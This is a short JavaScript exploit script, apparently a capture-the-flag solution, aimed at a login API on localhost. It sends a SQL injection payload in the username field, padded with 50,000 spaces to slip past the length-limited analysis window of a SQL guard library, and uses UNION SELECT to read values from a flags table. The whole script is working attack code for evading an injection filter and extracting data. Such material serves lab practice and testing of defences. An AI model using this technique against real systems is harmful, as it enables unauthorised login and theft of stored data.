const bypassLogin = async (payload) => {
    const res = await fetch('http://localhost:4000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: payload, password: "123" })
      });
    if (res.status !== 403) {
      console.log(`[SUCCESS LOGIN] Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}\n`);
    } else {
        console.log(`[BLOCKED LOGIN]`);
    }
}

const run = async () => {
    // 50KB padding to bypass the length limit on sqlguardjs analysis window
    const padding = " ".repeat(50000); 
    // In users table: id, username, password, role
    // In flags table: id, flag_value
    await bypassLogin(`fake_user' ${padding} UNION SELECT 1, flag_value, 'dummy', 'dummy' FROM flags--`);
};

run();
